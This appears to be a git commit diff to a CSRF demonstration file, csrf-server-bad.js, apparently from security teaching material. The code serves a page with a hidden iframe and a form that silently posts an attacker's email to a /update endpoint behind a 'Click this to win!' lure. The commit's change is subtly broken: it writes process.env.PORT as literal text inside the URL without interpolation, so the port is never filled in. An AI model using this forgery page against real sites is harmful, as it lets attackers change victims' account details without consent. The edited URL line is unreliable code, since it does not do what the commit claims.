2f8cc42b63af88a65d3329ca964a9d1a714baf39
XT Escarabat Verd <f.xaviertorta@gmail.com>
2022-10-17 12:23:32 +0200

    port .env csfr-server-bad.js

--- csrf-server-bad.js
+++ csrf-server-bad.js
@@ -7,7 +7,7 @@ const server = http.createServer((req, res) => {
   res.writeHead(200, { "Content-Type": "text/html" });
   res.end(`
 <iframe name=hide style="position:absolute;left:-1000px"></iframe>
-<form method="post" action="http://localhost:3000/update" target="hide">
+<form method="post" action="http://localhost:process.env.PORT/update" target="hide">
 <input type="hidden" name="email" value="${attackerEmail}">
 <input type="submit" value="Click this to win!">
 </form>`);
